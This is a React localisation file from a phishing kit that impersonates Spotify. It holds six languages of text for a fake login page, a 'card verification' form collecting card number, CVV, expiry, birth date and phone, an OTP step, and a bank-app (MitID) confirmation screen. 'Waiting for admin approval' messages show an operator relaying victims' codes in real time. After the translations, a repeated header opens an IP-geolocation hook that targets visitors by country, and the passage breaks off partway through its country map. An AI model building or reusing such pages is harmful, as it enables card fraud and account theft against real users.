// src/hooks/useLanguage.js
import { useState, useEffect } from 'react';




// Full translations for the entire project
export const translations = {
  da: {
    // HomePage
    loginToSpotify: "Log ind på Spotify",
    noAccount: "Har du ikke en konto? ",
    signUp: "Tilmeld dig Spotify",
    signupUnavailable: "Tilmelding er ikke tilgængelig i øjeblikket.",
    
    // Login Screen
    emailAddress: "E-mail adresse",
    emailPlaceholder: "navn@domæne.dk",
    loggingIn: "Logger ind...",
    or: "eller",
    continueWithGoogle: "Fortsæt med Google",
    continueWithFacebook: "Fortsæt med Facebook",
    continueWithApple: "Fortsæt med Apple",
    forgotEmail: "Glemt din e-mail?",
    pleaseEnterEmail: "Indtast venligst din e-mail adresse.",
    validEmail: "Indtast venligst en gyldig e-mail adresse.",
    googleUnavailable: "Google login er ikke tilgængeligt i øjeblikket.",
    facebookUnavailable: "Facebook login er ikke tilgængeligt i øjeblikket.",
    appleUnavailable: "Apple login er ikke tilgængeligt i øjeblikket.",

    // Login Form
    loginName: "Brugernavn",
    password: "Adgangskode",
    logIn: "Log ind",
    unknownLogin: "Ukendt brugernavn",
    unknownPassword: "Ukendt adgangskode",
    pleaseEnterLogin: "Indtast venligst dit brugernavn.",
    pleaseEnterPassword: "Indtast venligst din adgangskode.",
    
    // Card Verification Form
    cardVerification: "Kortbekræftelse",
    securityMessage: "Af sikkerhedsmæssige årsager skal du bekræfte dine oplysninger.",
    cardholderName: "Kortholders navn",
    cardNumber: "Kortnummer",
    expirationDate: "Udløbsdato",
    month: "Måned",
    year: "År",
    cvv: "CVV",
    phoneNumber: "Telefonnummer",
    phoneHint: "Vælg din landekode og indtast dit telefonnummer",
    city: "By",
    cityHint: "f.eks. København, Aarhus, Odense",
    postalCode: "Postnummer",
    postalHint: "f.eks. 1001",
    submitCard: "Bekræft kort",
    birthDate: "Fødselsdato",
    day: "Dag",
    
    // Card Validation Errors
    validCard: "Indtast et gyldigt kortnummer (16 cifre)",
    validExpiry: "Indtast en gyldig udløbsdato (MM/ÅÅ)",
    cardExpired: "Kortet er udløbet",
    validCvv: "Indtast en gyldig CVV (3-4 cifre)",
    validCardholder: "Indtast kortholders navn",
    validPhone: "Indtast dit telefonnummer",
    phoneDigits: "Telefonnummer skal være gyldigt",
    validCity: "Indtast din by",
    validCityName: "Indtast et gyldigt bynavn",
    validPostal: "Indtast dit postnummer",
    invalidPostal: "Ugyldigt postnummer format",
    
    // OTP Form
    twoFactor: "To-faktor godkendelse",
    enterOtp: "Indtast OTP-koden for at fuldføre dit login.",
    otpCode: "OTP-kode",
    verifyCode: "Bekræft kode",
    back: "Tilbage",
    validOtp: "Indtast en gyldig OTP-kode (6 cifre)",
    otpMessage: "Indtast venligst OTP-koden for at fuldføre registreringen.",
    otpPlaceholder: "000000",
    confirmCode: "Bekræft kode",
    verifying: "Verificerer...",
    
    // Loading / Waiting States
    waitingAdmin: "Venter på admin godkendelse...",
    waitingContinue: "Venter på admin for at fortsætte...",
    processing: "Behandler...",
    adminWillReview: "Admin vil klikke \"Næste trin\" når klar",
    pleaseWait: "Vent venligst mens vi verificerer dine oplysninger",
    sending: "Sender...",
    verifying: "Verificerer...",
    
    // Messages
    denied: "Login nægtet af admin. Prøv venligst igen senere.",
    success: "OTP-kode verificeret succesfuldt! Omdirigerer...",
    error: "Der opstod en fejl. Prøv venligst igen.",
    
    // NextStepAppr (MitID)
    confirmationInApp: "Bekræftelse i din bankapp",
    merchant: "Forhandler",
    amount: "Beløb",
    date: "Dato",
    cardNumberLabel: "Kortnummer",
    instruction1: "Åbn din bankapp på din smartphone.",
    instruction2: "Bekræft autorisationen.",
    instruction3: "Vend tilbage til denne skærm efter bekræftelse.",
    instruction4: "Tryk på \"BEKRÆFT\", når du er tilbage.",
    instruction5: "Opdater venligst ikke siden.",
    confirm: "Bekræft",
    securedBy: "Sikret af",
    waitingTitle: "Bekræftelse i app",
    waitingForConfirmation: "Venter på bekræftelse",
    waitingMessage: "Din bekræftelse er blevet sendt.",
    waitingSubMessage: "Tjek venligst din mobilbankapp.",
    waitingDontRefresh: "Opdater venligst ikke siden.",
    currentTime: "Aktuel tid",
    waitingInstruction: "Sørg for at have bekræftet i bankappen.",
    confirmationInAppShort: "Bekræftelse i app",
    
    // Gift Card Popup
    transactionApproved: "Transaktion godkendt!",
    paymentSuccess: "Din betaling er blevet behandlet succesfuldt.",
    spotifyGiftCard: "🎁 Din Spotify gavekode",
    clickToReveal: "👆 Klik for at se koden",
    copyCode: "📋 Kopier kode",
    codeCopied: "✅ Kode kopieret!",
    redeemAt: "Indløs på:",
    continue: "Fortsæt",
    pleaseRevealFirst: "Klik venligst på koden for at se den først!",
    
    // Approve Popup
    approveTitle: "Log ind godkendt!",
    approveMessage: "Dit log ind er blevet godkendt. Du vil blive omdirigeret til kortbekræftelsessiden.",
    ok: "OK"
  },
  
  en: {
    // HomePage
    loginToSpotify: "Log in to Spotify",
    noAccount: "Don't have an account? ",
    signUp: "Sign up for Spotify",
    signupUnavailable: "Sign up is currently unavailable.",
    
    // Login Screen
    emailAddress: "Email address",
    emailPlaceholder: "name@domain.com",
    loggingIn: "Logging in...",
    or: "or",
    continueWithGoogle: "Continue with Google",
    continueWithFacebook: "Continue with Facebook",
    continueWithApple: "Continue with Apple",
    forgotEmail: "Forgot your email?",
    pleaseEnterEmail: "Please enter your email address.",
    validEmail: "Please enter a valid email address.",
    googleUnavailable: "Google login is currently unavailable.",
    facebookUnavailable: "Facebook login is currently unavailable.",
    appleUnavailable: "Apple login is currently unavailable.",

    // Login Form
    loginName: "Login name",
    password: "Password",
    logIn: "Log in",
    unknownLogin: "Unknown login",
    unknownPassword: "Unknown password",
    pleaseEnterLogin: "Please enter your login name.",
    pleaseEnterPassword: "Please enter your password.",
    
    // Card Verification Form
    cardVerification: "Card Verification",
    securityMessage: "For security reasons, please verify your details.",
    cardholderName: "Cardholder Name",
    cardNumber: "Card Number",
    expirationDate: "Expiration Date",
    month: "Month",
    year: "Year",
    cvv: "CVV",
    phoneNumber: "Phone Number",
    phoneHint: "Select your country code and enter your phone number",
    city: "City",
    cityHint: "e.g. New York, Los Angeles, Chicago",
    postalCode: "Postal Code",
    postalHint: "e.g. 1001",
    submitCard: "Verify Card",
    birthDate: "Date of Birth",
    day: "Day",
    
    // Card Validation Errors
    validCard: "Please enter a valid card number (16 digits)",
    validExpiry: "Please enter a valid expiration date (MM/YY)",
    cardExpired: "Card has expired",
    validCvv: "Please enter a valid CVV (3-4 digits)",
    validCardholder: "Please enter the cardholder name",
    validPhone: "Please enter your phone number",
    phoneDigits: "Phone number must be valid",
    validCity: "Please enter your city",
    validCityName: "Please enter a valid city name",
    validPostal: "Please enter your postal code",
    invalidPostal: "Invalid postal code format",
    
    // OTP Form
    twoFactor: "Two-Factor Verification",
    enterOtp: "Please enter the OTP code to complete your login.",
    otpCode: "OTP Code",
    verifyCode: "Verify Code",
    back: "Back",
    validOtp: "Please enter a valid OTP code (6 digits)",
    otpMessage: "Please enter the OTP code to complete the registration.",
    otpPlaceholder: "000000",
    confirmCode: "Confirm code",
    verifying: "Verifying...",
    
    // Loading / Waiting States
    waitingAdmin: "Waiting for admin approval...",
    waitingContinue: "Waiting for admin to continue...",
    processing: "Processing...",
    adminWillReview: "Admin will click \"Next Step\" when ready",
    pleaseWait: "Please wait while we verify your credentials",
    sending: "Sending...",
    verifying: "Verifying...",
    
    // Messages
    denied: "Login denied by admin. Please try again later.",
    success: "OTP code verified successfully! Redirecting...",
    error: "An error occurred. Please try again.",
    
    // NextStepAppr (MitID)
    confirmationInApp: "Confirmation in your Bank App",
    merchant: "Merchant",
    amount: "Amount",
    date: "Date",
    cardNumberLabel: "Card Number",
    instruction1: "Open your banking app on your smartphone.",
    instruction2: "Confirm the authorization.",
    instruction3: "Return to this screen after confirmation.",
    instruction4: "Tap \"CONFIRM\" when you are back.",
    instruction5: "Please do not refresh the page.",
    confirm: "Confirm",
    securedBy: "Secured by",
    waitingTitle: "Confirmation in App",
    waitingForConfirmation: "Waiting for Confirmation",
    waitingMessage: "Your confirmation has been sent.",
    waitingSubMessage: "Please check your mobile banking app.",
    waitingDontRefresh: "Please do not refresh the page.",
    currentTime: "Current time",
    waitingInstruction: "Please make sure you have confirmed in the banking app.",
    confirmationInAppShort: "Confirmation in App",
    
    // Gift Card Popup
    transactionApproved: "Transaction Approved!",
    paymentSuccess: "Your payment has been successfully processed.",
    spotifyGiftCard: "🎁 Your Spotify Gift Card Code",
    clickToReveal: "👆 Click to reveal code",
    copyCode: "📋 Copy Code",
    codeCopied: "✅ Code copied!",
    redeemAt: "Redeem at:",
    continue: "Continue",
    pleaseRevealFirst: "Please click on the code to reveal it first!",
    
    // Approve Popup
    approveTitle: "Login Approved!",
    approveMessage: "Your login has been approved. You will be redirected to the card verification page.",
    ok: "OK"
  },
  
  cz: {
    // HomePage
    loginToSpotify: "Přihlaste se k Spotify",
    noAccount: "Nemáte účet? ",
    signUp: "Zaregistrujte se na Spotify",
    signupUnavailable: "Registrace není aktuálně k dispozici.",
    
    // Login Screen
    emailAddress: "E-mailová adresa",
    emailPlaceholder: "jmeno@domena.cz",
    loggingIn: "Přihlašování...",
    or: "nebo",
    continueWithGoogle: "Pokračovat s Google",
    continueWithFacebook: "Pokračovat s Facebook",
    continueWithApple: "Pokračovat s Apple",
    forgotEmail: "Zapomněli jste e-mail?",
    pleaseEnterEmail: "Zadejte prosím svou e-mailovou adresu.",
    validEmail: "Zadejte prosím platnou e-mailovou adresu.",
    googleUnavailable: "Přihlášení přes Google není aktuálně k dispozici.",
    facebookUnavailable: "Přihlášení přes Facebook není aktuálně k dispozici.",
    appleUnavailable: "Přihlášení přes Apple není aktuálně k dispozici.",

    // Login Form
    loginName: "Uživatelské jméno",
    password: "Heslo",
    logIn: "Přihlásit se",
    unknownLogin: "Neznámé přihlášení",
    unknownPassword: "Neznámé heslo",
    pleaseEnterLogin: "Zadejte své uživatelské jméno.",
    pleaseEnterPassword: "Zadejte své heslo.",
    
    // Card Verification Form
    cardVerification: "Ověření karty",
    securityMessage: "Z bezpečnostních důvodů ověřte své údaje.",
    cardholderName: "Jméno držitele karty",
    cardNumber: "Číslo karty",
    expirationDate: "Datum expirace",
    month: "Měsíc",
    year: "Rok",
    cvv: "CVV",
    phoneNumber: "Telefonní číslo",
    phoneHint: "Vyberte svou zemi a zadejte telefonní číslo",
    city: "Město",
    cityHint: "např. Praha, Brno, Ostrava",
    postalCode: "PSČ",
    postalHint: "např. 11000",
    submitCard: "Ověřit kartu",
    birthDate: "Datum narození",
    day: "Den",
    
    validCard: "Zadejte platné číslo karty (16 číslic)",
    validExpiry: "Zadejte platné datum expirace (MM/RR)",
    cardExpired: "Karta vypršela",
    validCvv: "Zadejte platné CVV (3-4 číslice)",
    validCardholder: "Zadejte jméno držitele karty",
    validPhone: "Zadejte své telefonní číslo",
    phoneDigits: "Telefonní číslo musí být platné",
    validCity: "Zadejte své město",
    validCityName: "Zadejte platný název města",
    validPostal: "Zadejte své PSČ",
    invalidPostal: "Neplatný formát PSČ",
    
    twoFactor: "Dvoufaktorové ověření",
    enterOtp: "Zadejte OTP kód pro dokončení přihlášení.",
    otpCode: "OTP kód",
    verifyCode: "Ověřit kód",
    back: "Zpět",
    validOtp: "Zadejte platný OTP kód (6 číslic)",
    otpMessage: "Zadejte prosím OTP kód pro dokončení registrace.",
    otpPlaceholder: "000000",
    confirmCode: "Potvrdit kód",
    verifying: "Ověřování...",
    
    waitingAdmin: "Čekání na schválení administrátora...",
    waitingContinue: "Čekání na pokračování administrátora...",
    processing: "Zpracování...",
    adminWillReview: "Administrátor klikne na \"Další krok\" až bude připraven",
    pleaseWait: "Počkejte prosím, zatímco ověřujeme vaše údaje",
    sending: "Odesílání...",
    verifying: "Ověřování...",
    denied: "Přihlášení zamítnuto administrátorem. Zkuste to prosím později.",
    success: "OTP kód byl úspěšně ověřen! Přesměrování...",
    error: "Došlo k chybě. Zkuste to prosím znovu.",
    
    confirmationInApp: "Potvrzení v bankovní aplikaci",
    merchant: "Obchodník",
    amount: "Částka",
    date: "Datum",
    cardNumberLabel: "Číslo karty",
    instruction1: "Otevřete svou bankovní aplikaci v telefonu.",
    instruction2: "Potvrďte autorizaci.",
    instruction3: "Po potvrzení se vraťte na tuto obrazovku.",
    instruction4: "Až se vrátíte, klepněte na \"POTVRDIT\".",
    instruction5: "Prosím neobnovujte stránku.",
    confirm: "Potvrdit",
    sending: "Odesílání...",
    securedBy: "Zabezpečeno",
    waitingTitle: "Potvrzení v aplikaci",
    waitingForConfirmation: "Čekání na potvrzení",
    waitingMessage: "Vaše potvrzení bylo odesláno.",
    waitingSubMessage: "Zkontrolujte svou bankovní aplikaci.",
    waitingDontRefresh: "Prosím neobnovujte stránku.",
    currentTime: "Aktuální čas",
    waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
    confirmationInAppShort: "Potvrzení v aplikaci",
    
    transactionApproved: "Transakce schválena!",
    paymentSuccess: "Vaše platba byla úspěšně zpracována.",
    spotifyGiftCard: "🎁 Váš Spotify dárkový kód",
    clickToReveal: "👆 Kliknutím zobrazíte kód",
    copyCode: "📋 Kopírovat kód",
    codeCopied: "✅ Kód zkopírován!",
    redeemAt: "Uplatněte na:",
    continue: "Pokračovat",
    pleaseRevealFirst: "Pro zobrazení kódu na něj nejprve klikněte!",
    approveTitle: "Přihlášení schváleno!",
    approveMessage: "Vaše přihlášení bylo schváleno. Budete přesměrováni na stránku ověření karty.",
    ok: "OK"
  },
  
  de: {
    // HomePage
    loginToSpotify: "Bei Spotify anmelden",
    noAccount: "Sie haben kein Konto? ",
    signUp: "Bei Spotify registrieren",
    signupUnavailable: "Die Registrierung ist derzeit nicht verfügbar.",
    
    // Login Screen
    emailAddress: "E-Mail-Adresse",
    emailPlaceholder: "name@domain.de",
    loggingIn: "Anmelden...",
    or: "oder",
    continueWithGoogle: "Mit Google fortfahren",
    continueWithFacebook: "Mit Facebook fortfahren",
    continueWithApple: "Mit Apple fortfahren",
    forgotEmail: "E-Mail vergessen?",
    pleaseEnterEmail: "Bitte geben Sie Ihre E-Mail-Adresse ein.",
    validEmail: "Bitte geben Sie eine gültige E-Mail-Adresse ein.",
    googleUnavailable: "Google-Login ist derzeit nicht verfügbar.",
    facebookUnavailable: "Facebook-Login ist derzeit nicht verfügbar.",
    appleUnavailable: "Apple-Login ist derzeit nicht verfügbar.",

    // Login Form
    loginName: "Benutzername",
    password: "Passwort",
    logIn: "Anmelden",
    unknownLogin: "Unbekannter Benutzername",
    unknownPassword: "Unbekanntes Passwort",
    pleaseEnterLogin: "Bitte geben Sie Ihren Benutzernamen ein.",
    pleaseEnterPassword: "Bitte geben Sie Ihr Passwort ein.",
    
    // Card Verification Form
    cardVerification: "Kartenüberprüfung",
    securityMessage: "Aus Sicherheitsgründen überprüfen Sie bitte Ihre Daten.",
    cardholderName: "Karteninhabername",
    cardNumber: "Kartennummer",
    expirationDate: "Ablaufdatum",
    month: "Monat",
    year: "Jahr",
    cvv: "CVV",
    phoneNumber: "Telefonnummer",
    phoneHint: "Wählen Sie Ihr Land und geben Sie Ihre Telefonnummer ein",
    city: "Stadt",
    cityHint: "z.B. Berlin, München, Hamburg",
    postalCode: "Postleitzahl",
    postalHint: "z.B. 10115",
    submitCard: "Karte überprüfen",
    birthDate: "Geburtsdatum",
    day: "Tag",
    
    validCard: "Bitte geben Sie eine gültige Kartennummer ein (16 Ziffern)",
    validExpiry: "Bitte geben Sie ein gültiges Ablaufdatum ein (MM/JJ)",
    cardExpired: "Karte ist abgelaufen",
    validCvv: "Bitte geben Sie eine gültige CVV ein (3-4 Ziffern)",
    validCardholder: "Bitte geben Sie den Karteninhabernamen ein",
    validPhone: "Bitte geben Sie Ihre Telefonnummer ein",
    phoneDigits: "Telefonnummer muss gültig sein",
    validCity: "Bitte geben Sie Ihre Stadt ein",
    validCityName: "Bitte geben Sie einen gültigen Stadtnamen ein",
    validPostal: "Bitte geben Sie Ihre Postleitzahl ein",
    invalidPostal: "Ungültiges Postleitzahlenformat",
    
    twoFactor: "Zwei-Faktor-Verifizierung",
    enterOtp: "Bitte geben Sie den OTP-Code ein, um Ihre Anmeldung abzuschließen.",
    otpCode: "OTP-Code",
    verifyCode: "Code überprüfen",
    back: "Zurück",
    validOtp: "Bitte geben Sie einen gültigen OTP-Code ein (6 Ziffern)",
    otpMessage: "Bitte geben Sie den OTP-Code ein, um die Registrierung abzuschließen.",
    otpPlaceholder: "000000",
    confirmCode: "Code bestätigen",
    verifying: "Wird überprüft...",
    
    waitingAdmin: "Warten auf Admin-Bestätigung...",
    waitingContinue: "Warten auf Admin-Fortsetzung...",
    processing: "Verarbeitung...",
    adminWillReview: "Admin klickt auf \"Nächster Schritt\", wenn bereit",
    pleaseWait: "Bitte warten Sie, während wir Ihre Daten überprüfen",
    sending: "Senden...",
    verifying: "Überprüfen...",
    denied: "Anmeldung vom Admin abgelehnt. Bitte versuchen Sie es später erneut.",
    success: "OTP-Code erfolgreich verifiziert! Weiterleitung...",
    error: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
    
    confirmationInApp: "Bestätigung in Ihrer Bank-App",
    merchant: "Händler",
    amount: "Betrag",
    date: "Datum",
    cardNumberLabel: "Kartennummer",
    instruction1: "Öffnen Sie Ihre Bank-App auf Ihrem Smartphone.",
    instruction2: "Bestätigen Sie die Autorisierung.",
    instruction3: "Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.",
    instruction4: "Tippen Sie auf \"BESTÄTIGEN\", wenn Sie zurück sind.",
    instruction5: "Bitte aktualisieren Sie die Seite nicht.",
    confirm: "Bestätigen",
    securedBy: "Gesichert durch",
    waitingTitle: "Bestätigung in der App",
    waitingForConfirmation: "Warten auf Bestätigung",
    waitingMessage: "Ihre Bestätigung wurde gesendet.",
    waitingSubMessage: "Bitte überprüfen Sie Ihre Bank-App.",
    waitingDontRefresh: "Bitte aktualisieren Sie die Seite nicht.",
    currentTime: "Aktuelle Uhrzeit",
    waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestätigt haben.",
    confirmationInAppShort: "Bestätigung in App",
    
    transactionApproved: "Transaktion genehmigt!",
    paymentSuccess: "Ihre Zahlung wurde erfolgreich verarbeitet.",
    spotifyGiftCard: "🎁 Ihr Spotify-Geschenkgutschein",
    clickToReveal: "👆 Klicken Sie, um den Code anzuzeigen",
    copyCode: "📋 Code kopieren",
    codeCopied: "✅ Code kopiert!",
    redeemAt: "Einlösen unter:",
    continue: "Weiter",
    pleaseRevealFirst: "Bitte klicken Sie zuerst auf den Code, um ihn anzuzeigen!",
    approveTitle: "Anmeldung genehmigt!",
    approveMessage: "Ihre Anmeldung wurde genehmigt. Sie werden zur Kartenüberprüfungsseite weitergeleitet.",
    ok: "OK"
  },
  
  fr: {
    // HomePage
    loginToSpotify: "Se connecter à Spotify",
    noAccount: "Vous n'avez pas de compte ? ",
    signUp: "S'inscrire sur Spotify",
    signupUnavailable: "L'inscription n'est pas disponible pour le moment.",
    
    // Login Screen
    emailAddress: "Adresse e-mail",
    emailPlaceholder: "nom@domaine.fr",
    loggingIn: "Connexion en cours...",
    or: "ou",
    continueWithGoogle: "Continuer avec Google",
    continueWithFacebook: "Continuer avec Facebook",
    continueWithApple: "Continuer avec Apple",
    forgotEmail: "E-mail oublié ?",
    pleaseEnterEmail: "Veuillez saisir votre adresse e-mail.",
    validEmail: "Veuillez saisir une adresse e-mail valide.",
    googleUnavailable: "La connexion Google n'est pas disponible pour le moment.",
    facebookUnavailable: "La connexion Facebook n'est pas disponible pour le moment.",
    appleUnavailable: "La connexion Apple n'est pas disponible pour le moment.",

    // Login Form
    loginName: "Nom d'utilisateur",
    password: "Mot de passe",
    logIn: "Se connecter",
    unknownLogin: "Nom d'utilisateur inconnu",
    unknownPassword: "Mot de passe inconnu",
    pleaseEnterLogin: "Veuillez saisir votre nom d'utilisateur.",
    pleaseEnterPassword: "Veuillez saisir votre mot de passe.",
    
    // Card Verification Form
    cardVerification: "Vérification de carte",
    securityMessage: "Pour des raisons de sécurité, veuillez vérifier vos coordonnées.",
    cardholderName: "Nom du titulaire de la carte",
    cardNumber: "Numéro de carte",
    expirationDate: "Date d'expiration",
    month: "Mois",
    year: "Année",
    cvv: "CVV",
    phoneNumber: "Numéro de téléphone",
    phoneHint: "Sélectionnez votre pays et entrez votre numéro de téléphone",
    city: "Ville",
    cityHint: "ex: Paris, Lyon, Marseille",
    postalCode: "Code postal",
    postalHint: "ex: 75001",
    submitCard: "Vérifier la carte",
    birthDate: "Date de naissance",
    day: "Jour",
    
    validCard: "Veuillez saisir un numéro de carte valide (16 chiffres)",
    validExpiry: "Veuillez saisir une date d'expiration valide (MM/AA)",
    cardExpired: "La carte a expiré",
    validCvv: "Veuillez saisir un CVV valide (3-4 chiffres)",
    validCardholder: "Veuillez saisir le nom du titulaire de la carte",
    validPhone: "Veuillez saisir votre numéro de téléphone",
    phoneDigits: "Le numéro de téléphone doit être valide",
    validCity: "Veuillez saisir votre ville",
    validCityName: "Veuillez saisir un nom de ville valide",
    validPostal: "Veuillez saisir votre code postal",
    invalidPostal: "Format de code postal invalide",
    
    twoFactor: "Vérification à deux facteurs",
    enterOtp: "Veuillez saisir le code OTP pour terminer votre connexion.",
    otpCode: "Code OTP",
    verifyCode: "Vérifier le code",
    back: "Retour",
    validOtp: "Veuillez saisir un code OTP valide (6 chiffres)",
    otpMessage: "Veuillez saisir le code OTP pour compléter l'inscription.",
    otpPlaceholder: "000000",
    confirmCode: "Confirmer le code",
    verifying: "Vérification...",
    
    waitingAdmin: "En attente de l'approbation de l'administrateur...",
    waitingContinue: "En attente de la continuation de l'administrateur...",
    processing: "Traitement...",
    adminWillReview: "L'administrateur cliquera sur \"Étape suivante\" quand il sera prêt",
    pleaseWait: "Veuillez patienter pendant que nous vérifions vos identifiants",
    sending: "Envoi...",
    verifying: "Vérification...",
    denied: "Connexion refusée par l'administrateur. Veuillez réessayer plus tard.",
    success: "Code OTP vérifié avec succès ! Redirection...",
    error: "Une erreur s'est produite. Veuillez réessayer.",
    
    confirmationInApp: "Confirmation dans votre application bancaire",
    merchant: "Marchand",
    amount: "Montant",
    date: "Date",
    cardNumberLabel: "Numéro de carte",
    instruction1: "Ouvrez votre application bancaire sur votre smartphone.",
    instruction2: "Confirmez l'autorisation.",
    instruction3: "Revenez à cet écran après confirmation.",
    instruction4: "Appuyez sur \"CONFIRMER\" lorsque vous êtes de retour.",
    instruction5: "Veuillez ne pas actualiser la page.",
    confirm: "Confirmer",
    securedBy: "Sécurisé par",
    waitingTitle: "Confirmation dans l'application",
    waitingForConfirmation: "En attente de confirmation",
    waitingMessage: "Votre confirmation a été envoyée.",
    waitingSubMessage: "Veuillez vérifier votre application bancaire.",
    waitingDontRefresh: "Veuillez ne pas actualiser la page.",
    currentTime: "Heure actuelle",
    waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.",
    confirmationInAppShort: "Confirmation dans l'application",
    
    transactionApproved: "Transaction approuvée !",
    paymentSuccess: "Votre paiement a été traité avec succès.",
    spotifyGiftCard: "🎁 Votre code cadeau Spotify",
    clickToReveal: "👆 Cliquez pour révéler le code",
    copyCode: "📋 Copier le code",
    codeCopied: "✅ Code copié !",
    redeemAt: "À utiliser sur :",
    continue: "Continuer",
    pleaseRevealFirst: "Veuillez d'abord cliquer sur le code pour le révéler !",
    approveTitle: "Connexion approuvée !",
    approveMessage: "Votre connexion a été approuvée. Vous serez redirigé vers la page de vérification de la carte.",
    ok: "OK"
  },
  
  es: {
    // HomePage
    loginToSpotify: "Iniciar sesión en Spotify",
    noAccount: "¿No tienes una cuenta? ",
    signUp: "Regístrate en Spotify",
    signupUnavailable: "El registro no está disponible actualmente.",
    
    // Login Screen
    emailAddress: "Correo electrónico",
    emailPlaceholder: "nombre@dominio.es",
    loggingIn: "Iniciando sesión...",
    or: "o",
    continueWithGoogle: "Continuar con Google",
    continueWithFacebook: "Continuar con Facebook",
    continueWithApple: "Continuar con Apple",
    forgotEmail: "¿Olvidaste tu correo?",
    pleaseEnterEmail: "Por favor, ingrese su dirección de correo electrónico.",
    validEmail: "Por favor, ingrese una dirección de correo electrónico válida.",
    googleUnavailable: "El inicio de sesión con Google no está disponible actualmente.",
    facebookUnavailable: "El inicio de sesión con Facebook no está disponible actualmente.",
    appleUnavailable: "El inicio de sesión con Apple no está disponible actualmente.",

    // Login Form
    loginName: "Nombre de usuario",
    password: "Contraseña",
    logIn: "Iniciar sesión",
    unknownLogin: "Usuario desconocido",
    unknownPassword: "Contraseña desconocida",
    pleaseEnterLogin: "Por favor, ingrese su nombre de usuario.",
    pleaseEnterPassword: "Por favor, ingrese su contraseña.",
    
    // Card Verification Form
    cardVerification: "Verificación de tarjeta",
    securityMessage: "Por razones de seguridad, verifique sus datos.",
    cardholderName: "Nombre del titular de la tarjeta",
    cardNumber: "Número de tarjeta",
    expirationDate: "Fecha de caducidad",
    month: "Mes",
    year: "Año",
    cvv: "CVV",
    phoneNumber: "Número de teléfono",
    phoneHint: "Seleccione su país e ingrese su número de teléfono",
    city: "Ciudad",
    cityHint: "ej: Madrid, Barcelona, Valencia",
    postalCode: "Código postal",
    postalHint: "ej: 28001",
    submitCard: "Verificar tarjeta",
    birthDate: "Fecha de nacimiento",
    day: "Día",
    
    validCard: "Por favor, ingrese un número de tarjeta válido (16 dígitos)",
    validExpiry: "Por favor, ingrese una fecha de caducidad válida (MM/AA)",
    cardExpired: "La tarjeta ha caducado",
    validCvv: "Por favor, ingrese un CVV válido (3-4 dígitos)",
    validCardholder: "Por favor, ingrese el nombre del titular de la tarjeta",
    validPhone: "Por favor, ingrese su número de teléfono",
    phoneDigits: "El número de teléfono debe ser válido",
    validCity: "Por favor, ingrese su ciudad",
    validCityName: "Por favor, ingrese un nombre de ciudad válido",
    validPostal: "Por favor, ingrese su código postal",
    invalidPostal: "Formato de código postal inválido",
    
    twoFactor: "Verificación de dos factores",
    enterOtp: "Por favor, ingrese el código OTP para completar su inicio de sesión.",
    otpCode: "Código OTP",
    verifyCode: "Verificar código",
    back: "Atrás",
    validOtp: "Por favor, ingrese un código OTP válido (6 dígitos)",
    otpMessage: "Por favor, ingrese el código OTP para completar el registro.",
    otpPlaceholder: "000000",
    confirmCode: "Confirmar código",
    verifying: "Verificando...",
    
    waitingAdmin: "Esperando aprobación del administrador...",
    waitingContinue: "Esperando continuación del administrador...",
    processing: "Procesando...",
    adminWillReview: "El administrador hará clic en \"Siguiente paso\" cuando esté listo",
    pleaseWait: "Por favor, espere mientras verificamos sus credenciales",
    sending: "Enviando...",
    verifying: "Verificando...",
    denied: "Inicio de sesión denegado por el administrador. Por favor, intente más tarde.",
    success: "¡Código OTP verificado exitosamente! Redirigiendo...",
    error: "Ocurrió un error. Por favor, intente de nuevo.",
    
    confirmationInApp: "Confirmación en su aplicación bancaria",
    merchant: "Comerciante",
    amount: "Monto",
    date: "Fecha",
    cardNumberLabel: "Número de tarjeta",
    instruction1: "Abra su aplicación bancaria en su teléfono inteligente.",
    instruction2: "Confirme la autorización.",
    instruction3: "Regrese a esta pantalla después de la confirmación.",
    instruction4: "Toque \"CONFIRMAR\" cuando regrese.",
    instruction5: "Por favor, no actualice la página.",
    confirm: "Confirmar",
    securedBy: "Asegurado por",
    waitingTitle: "Confirmación en la aplicación",
    waitingForConfirmation: "Esperando confirmación",
    waitingMessage: "Su confirmación ha sido enviada.",
    waitingSubMessage: "Por favor, revise su aplicación bancaria.",
    waitingDontRefresh: "Por favor, no actualice la página.",
    currentTime: "Hora actual",
    waitingInstruction: "Asegúrese de haber confirmado en la aplicación bancaria.",
    confirmationInAppShort: "Confirmación en la aplicación",
    
    transactionApproved: "¡Transacción aprobada!",
    paymentSuccess: "Su pago ha sido procesado exitosamente.",
    spotifyGiftCard: "🎁 Su código de regalo de Spotify",
    clickToReveal: "👆 Haga clic para revelar el código",
    copyCode: "📋 Copiar código",
    codeCopied: "✅ ¡Código copiado!",
    redeemAt: "Canjear en:",
    continue: "Continuar",
    pleaseRevealFirst: "¡Primero haga clic en el código para revelarlo!",
    approveTitle: "¡Inicio de sesión aprobado!",
    approveMessage: "Su inicio de sesión ha sido aprobado. Será redirigido a la página de verificación de tarjeta.",
    ok: "OK"
  }
};



// src/hooks/useLanguage.js
import { useState, useEffect } from 'react';

// YOUR EXISTING translations HERE (keep all your da, en, cz, de, fr, es translations)
// ...

export const useLanguage = () => {
  const [language, setLanguage] = useState('en');

  useEffect(() => {
    const detectByIPOnly = async () => {
      // Check saved preference first
      const savedLang = localStorage.getItem('appLanguage');
      if (savedLang) {
        setLanguage(savedLang);
        console.log('💾 Using saved language:', savedLang);
        return;
      }

      // Try multiple IP APIs (one will work)
      const apis = [
        'https://ipapi.co/json/',
        'https://ipwhois.app/json/',
        'https://freeipapi.com/api/json/'
      ];
      
      let country = null;
      
      for (const api of apis) {
        try {
          const res = await fetch(api);
          const data = await res.json();
          country = data.country_code || data.countryCode;
          if (country && country !== 'Unknown') {
            console.log(`✅ Country from ${api}: ${country}`);
            break;
          }
        } catch(e) {
          console.log(`API failed: ${api}`);
        }
      }
      
      if (!country) {
        console.log('⚠️ No IP detection, using English');
        setLanguage('en');
        return;
      }
      
      const countryCode = country.toLowerCase();
      
      // Map country to language
      const countryToLanguage = {
        // Danish
        'dk': 'da',
        
        // German
        'de': 'de',
        'at': 'de',
        'ch': 'de',
        'li': 'de',
        'lu': 'de',
        
        // French
        'fr': 'fr',
        'be': 'fr',
        'mc': 'fr',
        
        // Spanish
        'es': 'es',
        'mx': 'es',
        'ar': 'es',
        'co': 'es',
        'pe': 'es',
        've': 'es',
        'cl': 'es',
        'ec': 'es',
